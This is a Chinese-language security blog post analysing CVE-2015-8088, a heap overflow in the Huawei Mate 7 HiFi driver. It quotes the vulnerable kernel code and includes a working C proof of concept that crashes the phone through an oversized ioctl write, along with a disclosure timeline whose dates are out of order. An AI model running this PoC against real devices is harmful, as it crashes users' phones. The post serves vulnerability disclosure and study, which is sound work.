<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>CVE-2015-8088: 华为智能手机HiFi驱动堆溢出</title>

  <meta name="description" content="Shawn：感谢Pray3r的分享，驱动一直以来都是linux内核的重灾区，要以不断修复bug的方式去防御漏洞几乎是1990年代的方案，另外一方面，作为厂商也应该加大代码审计的投入。这篇分析的英文版已经分享到了DNFWAH Issue 5上。">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

  <link rel="shortcut icon" href="/favicon.ico">

  <link rel="stylesheet" href="/css/style.css">

  <link rel="canonical" href="http://www.hardenedlinux.org/system-security/2016/01/20/cve-2015-8088-analysis.html">
  <link rel="alternate" type="application/rss+xml" title="Hardened GNU/Linux" href="http://www.hardenedlinux.org/feed.xml" />

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-1566884-2', 'auto');
  ga('send', 'pageview');

</script>
</head>
 
<body class="post-template tag-text tag-formatting tag-list tag-images-2">
<div class="site-main">
        <header class="site-header">
    <a href="Hardened GNU/Linux"><img class="blog-logo" src="/images/logo_400.png" alt="Blog Logo"></a>
    <h1 class="blog-title"><a href="http://www.hardenedlinux.org">Hardened GNU/Linux</a></h1>
    <h2 class="blog-description">We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!! A small step in security hardening --> A giant leap in Free & Open source software!!!
</h2>
    <ul class="nav">
        <li class="nav-home" role="presentation">
	    <a href="http://www.hardenedlinux.org">Home</a>
	</li>
        <li class="nav-about" role="presentation">
	    <a href="http://www.hardenedlinux.org/about">About</a>
	</li>
        <li class="nav-about" role="presentation">
	    <a href="http://www.hardenedlinux.org/about2">Contribution</a>
	</li>
    </ul>
</header>
 
        <div class="site-content" role="main">
    <article class="post tag-text tag-formatting tag-list"> 
        <header class="post-header">
	    <h1 class="post-title">CVE-2015-8088: 华为智能手机HiFi驱动堆溢出</h1>
	    <span class="post-meta">
	       Post on <time datetime="2016-01-20">20 January 2016</time>
	    </span>
	</header>
	<section class="post-content">
	    <p>Shawn：感谢Pray3r的分享，驱动一直以来都是linux内核的重灾区，要以不断修复bug的方式去防御漏洞几乎是1990年代的方案，另外一方面，作为厂商也应该加大代码审计的投入。这篇分析的<a href="https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x03_DNFWAH_cve-2015-8088-heap-overflow-analysis.txt">英文版已经分享到了DNFWAH Issue 5</a>上。</p>

<p>By Pray3r</p>

<h3 id="description">Description</h3>
<p><code>/dev/hifi_misc</code> 是用户空间到内核空间中Hisi 芯片的一个接口，该接口和Hifi相关。我们看到<code>drivers/hisi/hifidsp/hifi_lpp.c</code>中的代码，攻击者可以在用户空间下，可以使用<code>HIFI_MISC_IOCTL_WRITE_PARAMS</code>参数，并通过调用<code>ioctl()</code>执行到该代码路径：</p>

<div class="highlight"><pre><code class="language-html" data-lang="html">static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned long arg)
{
[...]
	switch(cmd) {
		[...]
		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/
			ret = hifi_dsp_write_param(arg);
		        break;
		[...]
	}
[...]
}</code></pre></div>

<p>之后，<code>hifi_dsp_write_param()</code>函数被调用，它的参数来自用户空间：</p>

<div class="highlight"><pre><code class="language-html" data-lang="html">int hifi_dsp_write_param(unsigned long arg)
{
	int ret = OK;
	phys_addr_t hifi_param_phy_addr = 0;
	void*		hifi_param_vir_addr = NULL;
	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr = NULL;
	struct misc_io_sync_param para;
[...]
	if (copy_from_user(<span class="err">&amp;</span>para, (void*)arg, sizeof(struct misc_io_sync_param))) {  // arg --&gt; para
		loge(&quot;copy_from_user fail.\n&quot;);
		ret = ERROR;
		goto error1;
	}
[...]
	hifi_param_vir_addr = (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_PARAM_PRIV); // heap alloc
	if (NULL == hifi_param_vir_addr) {
		loge(&quot;hifi_param_vir_addr ioremap fail\n&quot;);
		ret = ERROR;
		goto error2;
	}
[...]
	ret = copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_in); // heap overflow
	if ( ret != 0) {
		loge(&quot;copy data to hifi error! ret = %d&quot;, ret);
	}
[...]
}</code></pre></div>

<p>参数<code>arg</code>是一个结构体指针，指向用户空间的内存。<code>hifi_dsp_write_param()</code>函数初始化之后，使用<code>copy_from_user()</code>将用户空间的数据<code>(arg)</code>拷贝到内核空间中<code>(para)</code>。注意，它没做任何验证，就将用户空间下的所用的成员变量拷贝到内核空间中。<code>para</code>结构如下：</p>

<div class="highlight"><pre><code class="language-html" data-lang="html">struct misc_io_sync_param {
	void *                  para_in;          
	unsigned int            para_size_in;      
	void *                  para_out;          
	unsigned int            para_size_out;  
};</code></pre></div>

<p>紧接着，又调用了<code>copy_from_user(hifi_param_vir_addr,
  para.para_in, para.para_size_in)</code></p>

<ul>
  <li><code>hifi_param_vir_addr</code>指向一块由<code>ioremap()</code>分配的堆内存，这块堆内存的大小为<code>SIZE_PARAM_PRIV</code>(200 * 1024)字节。</li>
  <li><code>para.para_in</code>指针由用户空间控制，它是存储数据的内存。</li>
  <li><code>para.para_size_in</code>是一个<code>unsigned int</code>由用户空间控制，它是<code>para.para_in</code>的大小。</li>
</ul>

<p>然而，代码中没有对<code>para.para_in</code>和<code>para.para_size_in</code>进行验证，如果<code>para.para_size_in</code>大于<code>200 * 1024</code>,例如<code>300 * 1024</code>，将产生一个堆溢出。PoC如下：</p>

<div class="highlight"><pre><code class="language-html" data-lang="html">/*
 *
 *  HuaWei Mate7 hifi driver Poc
 *
 *  Writen by pray3r<span class="nt">&lt;pray3r.z</span><span class="err">@</span><span class="na">gmail</span><span class="err">.</span><span class="na">com</span><span class="nt">&gt;</span>
 *
 */

#include <span class="nt">&lt;stdio.h&gt;</span>
#include <span class="nt">&lt;stdlib.h&gt;</span>
#include <span class="nt">&lt;fcntl.h&gt;</span>
#include <span class="nt">&lt;sys</span><span class="err">/</span><span class="na">types</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
#include <span class="nt">&lt;sys</span><span class="err">/</span><span class="na">stat</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
#include <span class="nt">&lt;sys</span><span class="err">/</span><span class="na">ioctl</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>

#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR(&#39;A&#39;, 0x75, struct misc_io_sync_param)

struct misc_io_sync_param {
	void *                  para_in;           
	unsigned int            para_size_in;       
	void *                  para_out;           
	unsigned int            para_size_out;   
};

int main(int arg, char **argv)
{
	int fd; 
	void *in = malloc(300 * 1024);
	void *out = malloc(100);
	struct misc_io_sync_param poc;

	poc.para_in = in;
	poc.para_size_in = 300 * 1024;
	poc.para_out = out;
	poc.para_size_out = 100;

	fd = open(&quot;/dev/hifi_misc&quot;, O_RDWR);

	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, <span class="ni">&amp;poc);</span>

	free(in);
	free(out);

	return 0;
}</code></pre></div>

<p>执行这个PoC将导致Mate 7崩溃，请注意，该PoC至少需要在audio或system用户下执行，因为<code>/dev/hifi_misc</code>在audio和system用户下才有可写的权限。</p>

<h3 id="impact">Impact</h3>

<p>给<code>para.para_size</code>设置一个很大的值，手机会崩溃，但是想利用这个漏洞提权是非常困难的，因为在<code>ioremap()</code>[1]的实现调用了<code>get_vm_area_node()</code>，这个函数总是会设置PAGE_SIZE大小的保护页。</p>

<p>感谢Dan Rosenberg的指点。[2]</p>

<h3 id="affected">Affected</h3>

<div class="highlight"><pre><code class="language-html" data-lang="html">Model   : HUAWEI MT7-TL10
Version : MT7-TL10V100R001CHNC00B133
Android : 4.4.2
Kernel  : 3.10.30-00015-g049a08f</code></pre></div>

<p>其它类似的华为手机可能也受影响。</p>

<h3 id="patch">Patch</h3>

<p>参考华为官网的信息： <br />
 <a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm">http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm</a></p>

<h3 id="timeline">TimeLine</h3>

<p>Sep 28 2015 - Report sent to Huawei PSIRT <br />
 Sep 10 2015 - Huawei confirmed the security issues <br />
 Nov 04 2015 - Huawei fixed and public the security issues <br />
 Nov 09 2015 - Update CVE number   </p>

<h3 id="reference">Reference</h3>
<p>[1]. http://lxr.free-electrons.com/source/mm/vmalloc.c#L1351
[2]. http://seclists.org/oss-sec/2015/q4/532</p>

	</section>
	<section class="post-footer">
	    <div class="post-tags">
	        Tagged with: <a class='category' href='http://hardenedlinux.org/categories/system-security/'>system-security</a>
	    </div>
	</section>
    </article>
</div>
 
        <footer class="site-footer">
    <a href="https://github.com/hardenedlinux"><i class="fa fa-github-alt fa-2x"></i></a>
    <a href="mailto:hardenedlinux@gmail.com"><i class="fa fa-envelope fa-2x"></i></a>
    <a href="https://twitter.com/hardenedlinux"><i class="fa fa-twitter fa-2x"></i></a>
    <a href="https://groups.google.com/forum/#!forum/hardenedlinux"><i class="fa fa-google fa-2x"></i></a>
    <div class="inner">
        <section class="copyright">This theme copyright by <a href="http://scotthsmith.com">Scott Smith</a></section>
    </div>
</footer>
 
</div>
<script src="//use.typekit.net/qdi5fpu.js"></script>
<script>try{Typekit.load({ async: true });}catch(e){}</script>
</body>
</html>
